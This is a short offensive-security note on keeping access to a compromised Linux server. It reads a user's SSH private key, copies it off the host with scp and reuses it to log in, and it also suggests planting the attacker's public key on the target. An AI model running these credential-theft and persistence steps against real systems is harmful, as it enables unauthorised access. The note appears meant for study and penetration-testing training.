# Persistence via SSH Keys

- Linux is usually deployed as a server OS and are typically accessed remotely via services/protocols like SSH
- SSH can be leveraged for persistence
- Transferring the private key of a user to our system and use it to authenticate

## Demonstration

```bash
ssh <user>@<ip>
$ cd ~/.ssh
$ cat id_rsa
# copy the priv key
scp <user>@<ip>:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa <user>@<ip>
```

Ideally generate a key pair and let the public key on the target system
